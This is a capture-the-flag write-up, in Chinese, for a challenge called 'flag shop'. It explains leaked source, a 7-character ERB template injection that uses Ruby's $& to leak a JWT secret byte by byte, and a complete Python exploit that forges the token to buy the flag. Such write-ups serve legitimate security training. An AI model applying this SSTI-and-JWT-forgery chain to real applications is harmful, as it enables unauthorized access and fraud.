### flag shop

> 出题人：evoA
>
> 解题人数：10
>
> 最终分数：689

扫robots.txt发现源码泄露，访问/filebak得到源码，/work路由有个功能模糊的正则匹配功能，猜测做题会用到

```ruby
unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end
```

然后这里存在一个erb模版注入

```ruby
ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result
```

参考https://www.anquanke.com/post/id/86867

但是只能输入7个字符，除去<%==>只有两个字符可以利用，这时可以利用ruby全局变量$&，可以获得上一次正则匹配的结果，结合上面那个模糊的公就可以爆破JWT secret伪造jkl购买flag即可

exp: 

```python
#python 3
import requests

import jwt
import base64
# pip install PyJWT

dic = "0123456789abcdefghijklmnopqrstuvwxyz"
secret = ""
host = "http://47.110.15.101"
authUrl = host+"/api/auth"
workUrl = host+"/work"
shopUrl = host+"/shop"

req = requests.session()
# 获取身份
req.get(authUrl)

die = False
for i in range(50):

    if die:
        break
    for j in dic:
        url = workUrl + "?SECRET=" + secret + j + "&" + "name=<%25=$%26%25>" + "&" + "do=<%25=$%26%25> is working"

        res = req.get(url)
        #print(res.text)
        if secret + j in res.text:
            secret += j
            print(secret)
            break
        else:
            if j == "z":
                die = True
                break
            continue

die = False
for i in range(50):
    if die:
        break
    for j in dic:
        url = workUrl + "?SECRET=" + j + secret + "&" + "name=<%25=$%26%25>" + "&" + "do=<%25=$%26%25> is working"
        res = req.get(url)
        if j + secret in res.text:
            secret = j+secret
            print(secret)
            break
        else:
            if j == "z":
                die = True
                print("get! this is SECRET: "+secret)
                break
            continue

mycookie = req.cookies.get("auth")
print(mycookie)
mysecret = jwt.decode(mycookie,secret, algorithm='HS256')

mysecret['jkl'] = 10000000000000000000000000000

mycookie = jwt.encode(mysecret,secret,algorithm='HS256')
mycookie = str(mycookie, encoding='ascii')

req.cookies.clear()

req.cookies.set("auth",mycookie)

res = req.post(shopUrl)
# req.cookies.pop(0)
flag = req.cookies.values()[1].split(".")[1].encode(encoding='utf-8')
flag += (len(flag) % 4) * b"="
flag = base64.b64decode(flag)
print(flag)
#print(req.cookies.values())
# flag = jwt.decode(flag,secret, algorithm='HS256')
#
# print(flag)
```

